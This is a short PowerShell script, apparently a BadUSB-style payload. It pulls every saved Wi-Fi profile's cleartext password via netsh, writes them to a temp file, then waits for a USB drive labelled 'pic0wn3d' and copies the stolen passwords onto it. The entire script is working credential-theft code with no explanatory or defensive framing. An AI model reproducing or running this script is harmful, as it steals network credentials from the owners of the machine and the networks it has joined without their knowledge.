$SourceFile = "$env:TEMP\wifi_passwords.txt"

netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object {
    ($_ -split ': ')[-1].Trim()
} | ForEach-Object {
    $p = $_
    $pw = netsh wlan show profile name="$p" key=clear | Select-String 'Key Content'
    if ($pw) {
        "Profile: $p, Password: " + ($pw -split ': ')[-1].Trim()
    } else {
        "Profile: $p, Password: Not found or not available."
    }
} | Out-File -FilePath $SourceFile -Encoding UTF8

$TargetDriveLabel = "pic0wn3d"
$Attempts = 0
$MaxAttempts = 10

while ($Attempts -lt $MaxAttempts) {
    $Drives = Get-Volume | Where-Object { $_.FileSystemLabel -eq $TargetDriveLabel }
    if ($Drives) {
        $TargetPath = "$($Drives.DriveLetter):\"
        Copy-Item $SourceFile -Destination $TargetPath -Force
        exit
    }
    Start-Sleep -Seconds 1
    $Attempts++
}
